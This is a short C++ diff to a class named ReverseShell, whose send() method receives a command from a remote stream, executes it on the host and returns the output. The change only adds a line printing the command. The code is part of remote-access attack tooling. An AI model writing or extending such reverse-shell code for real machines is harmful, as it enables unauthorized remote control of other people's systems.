@@ -91,6 +91,7 @@ ReverseShell::ReverseShell(const Stream &stream) : Sender(stream){}
 
 void ReverseShell::send() {
     std::string command = stream.readString();
+    std::cout << command << std::endl;
     std::string resultOfCommand = executeCommand(Converter::string2wstring(command));
     stream.sendString(resultOfCommand.c_str());
 }
